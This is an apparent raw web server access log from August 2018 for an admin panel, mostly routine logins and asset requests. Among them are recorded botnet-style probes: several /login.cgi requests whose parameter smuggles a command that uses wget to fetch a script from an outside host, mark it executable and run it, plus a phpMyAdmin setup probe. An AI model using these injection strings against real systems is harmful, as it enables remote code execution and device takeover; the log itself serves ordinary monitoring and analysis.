114.242.248.113 - - [31/Aug/2018:00:39:10 +0000] "GET /sys/user/list?_search=false&nd=1535675950383&limit=10&page=1&sidx=&order=asc&_=1535675950206 HTTP/1.1" 200 400 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
58.247.204.63 - - [31/Aug/2018:00:39:10 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
58.247.204.63 - - [31/Aug/2018:00:39:11 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko)     \x09\x09Chrome/46.0.2490.11 Mobile Safari/537.36" "-"
58.247.204.63 - - [31/Aug/2018:00:39:11 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30" "-"
58.247.204.63 - - [31/Aug/2018:00:39:11 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30" "-"
58.247.204.63 - - [31/Aug/2018:00:39:11 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
114.242.248.113 - - [31/Aug/2018:00:39:11 +0000] "GET /sys/role.html HTTP/1.1" 200 2905 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:12 +0000] "GET /js/sys/role.js?_1535675951936 HTTP/1.1" 200 3886 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:12 +0000] "GET /sys/role/list?_search=false&nd=1535675952179&limit=10&page=1&sidx=&order=asc&_=1535675952001 HTTP/1.1" 200 85 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
223.166.151.199 - - [31/Aug/2018:00:39:35 +0000] "GET /index.html HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko)     \x09\x09Chrome/46.0.2490.11 Mobile Safari/537.36" "-"
223.166.151.199 - - [31/Aug/2018:00:39:35 +0000] "GET /login.html;JSESSIONID=a1bd46ec-48b4-4737-a65f-d9435cdf8c18 HTTP/1.1" 200 4135 "http://47.92.143.230/index.html" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko)     \x09\x09Chrome/46.0.2490.11 Mobile Safari/537.36" "-"
223.166.151.199 - - [31/Aug/2018:00:39:35 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=a1bd46ec-48b4-4737-a65f-d9435cdf8c18" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
223.166.151.199 - - [31/Aug/2018:00:39:36 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=a1bd46ec-48b4-4737-a65f-d9435cdf8c18" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30" "-"
223.166.151.199 - - [31/Aug/2018:00:39:36 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=a1bd46ec-48b4-4737-a65f-d9435cdf8c18" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36" "-"
223.166.151.199 - - [31/Aug/2018:00:39:37 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=a1bd46ec-48b4-4737-a65f-d9435cdf8c18" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
223.166.151.199 - - [31/Aug/2018:00:39:37 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=a1bd46ec-48b4-4737-a65f-d9435cdf8c18" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30" "-"
223.166.151.199 - - [31/Aug/2018:00:39:37 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=a1bd46ec-48b4-4737-a65f-d9435cdf8c18" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
139.162.106.181 - - [31/Aug/2018:00:48:04 +0000] "GET / HTTP/1.1" 302 0 "-" "Go-http-client/1.1" "-"
42.117.245.227 - - [31/Aug/2018:01:04:14 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 173 "-" "Hakai/2.0" "-"
93.179.68.150 - - [31/Aug/2018:01:04:31 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 302 0 "-" "Mozilla/5.0" "-"
156.218.231.19 - - [31/Aug/2018:01:33:28 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.112.150/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 400 173 "-" "LMAO/2.0" "-"
156.208.65.236 - - [31/Aug/2018:01:34:59 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.112.150/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 400 173 "-" "LMAO/2.0" "-"
156.208.65.236 - - [31/Aug/2018:01:35:02 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.112.150/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 400 173 "-" "LMAO/2.0" "-"
111.125.139.223 - - [31/Aug/2018:01:45:33 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
5.188.210.12 - - [31/Aug/2018:02:19:10 +0000] "\x05\x01\x00" 400 173 "-" "-" "-"
5.188.210.12 - - [31/Aug/2018:02:25:44 +0000] "\x04\x01\x00P\x05\xBC\xD2\x0C\x00" 400 173 "-" "-" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /hello.jpg HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33 HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /statics/css/font-awesome.min.css HTTP/1.1" 200 31000 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /statics/css/main.css HTTP/1.1" 200 1057 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /statics/css/all-skins.min.css HTTP/1.1" 200 40757 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /statics/css/AdminLTE.min.css HTTP/1.1" 200 90140 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:58 +0000] "GET /statics/css/bootstrap.min.css HTTP/1.1" 200 121200 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /captcha.jpg HTTP/1.1" 200 2992 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /statics/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "http://47.92.143.230/statics/css/bootstrap.min.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /favicon.ico HTTP/1.1" 302 0 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:25:59 +0000] "GET /login.html HTTP/1.1" 200 4135 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:25 +0000] "POST /sys/login HTTP/1.1" 200 39 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:25 +0000] "GET /statics/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77160 "http://47.92.143.230/statics/css/font-awesome.min.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:25 +0000] "GET /captcha.jpg?t=1535682385532 HTTP/1.1" 200 3147 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:31 +0000] "POST /sys/login HTTP/1.1" 200 39 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:31 +0000] "GET /captcha.jpg?t=1535682391846 HTTP/1.1" 200 2855 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:35 +0000] "POST /sys/login HTTP/1.1" 200 39 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:35 +0000] "GET /captcha.jpg?t=1535682395393 HTTP/1.1" 200 3064 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "POST /sys/login HTTP/1.1" 200 10 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /index.html HTTP/1.1" 200 5376 "http://47.92.143.230/login.html;JSESSIONID=ce00ab6c-e7d8-4a59-9f93-f46a7afeda33" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /statics/libs/router.js HTTP/1.1" 200 1777 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /statics/plugins/layer/layer.js HTTP/1.1" 200 21343 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /js/index.js HTTP/1.1" 200 2905 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /statics/plugins/layer/skin/default/layer.css?v=3.0.11110 HTTP/1.1" 200 14296 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /sys/user/info?_1535682400398 HTTP/1.1" 200 179 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /sys/menu/user?_1535682400397 HTTP/1.1" 200 1499 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /sys/main.html HTTP/1.1" 200 139 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:40 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:43 +0000] "GET /sys/menu.html HTTP/1.1" 200 4366 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:43 +0000] "GET /statics/plugins/ztree/css/metroStyle/metroStyle.css HTTP/1.1" 200 6576 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:43 +0000] "GET /statics/plugins/jqgrid/ui.jqgrid-bootstrap.css HTTP/1.1" 200 18291 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:43 +0000] "GET /statics/plugins/jqgrid/grid.locale-cn.js HTTP/1.1" 200 9369 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:43 +0000] "GET /statics/plugins/ztree/jquery.ztree.all.min.js HTTP/1.1" 200 63404 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:44 +0000] "GET /js/common.js HTTP/1.1" 200 1634 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:44 +0000] "GET /js/sys/menu.js?_1535682403797 HTTP/1.1" 200 4467 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:44 +0000] "GET /statics/plugins/jqgrid/jquery.jqGrid.min.js HTTP/1.1" 200 334710 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:44 +0000] "GET /sys/menu/list?_search=false&nd=1535682404647&limit=10&page=1&sidx=&order=asc&_=1535682403880 HTTP/1.1" 200 1828 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:47 +0000] "GET /sys/menu/select?_=1535682403881 HTTP/1.1" 200 1657 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:26:59 +0000] "GET /sys/menu/list?_search=false&nd=1535682419111&limit=10&page=1&sidx=&order=asc&_=1535682403882 HTTP/1.1" 200 1828 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:06 +0000] "GET /sys/menu/info/15?_=1535682403883 HTTP/1.1" 200 185 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:06 +0000] "GET /sys/menu/select?_=1535682403884 HTTP/1.1" 200 1657 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:11 +0000] "GET /sys/menu/list?_search=false&nd=1535682431430&limit=10&page=1&sidx=&order=asc&_=1535682403885 HTTP/1.1" 200 1828 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:15 +0000] "GET /sys/generator.html HTTP/1.1" 200 1564 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:16 +0000] "GET /js/sys/generator.js?_1535682435971 HTTP/1.1" 200 1548 "http://47.92.143.230/sys/generator.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:16 +0000] "GET /sys/generator/list?_search=false&nd=1535682436034&limit=10&page=1&sidx=&order=asc&_=1535682435991 HTTP/1.1" 200 884 "http://47.92.143.230/sys/generator.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:30 +0000] "GET /sys/log.html HTTP/1.1" 200 1502 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:30 +0000] "GET /js/sys/log.js?_1535682450801 HTTP/1.1" 200 1597 "http://47.92.143.230/sys/log.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:30 +0000] "GET /sys/log/list?_search=false&nd=1535682450855&limit=10&page=1&sidx=&order=asc&_=1535682450818 HTTP/1.1" 200 871 "http://47.92.143.230/sys/log.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:36 +0000] "GET /sys/config.html HTTP/1.1" 200 2922 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:36 +0000] "GET /js/sys/config.js?_1535682456671 HTTP/1.1" 200 2695 "http://47.92.143.230/sys/config.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
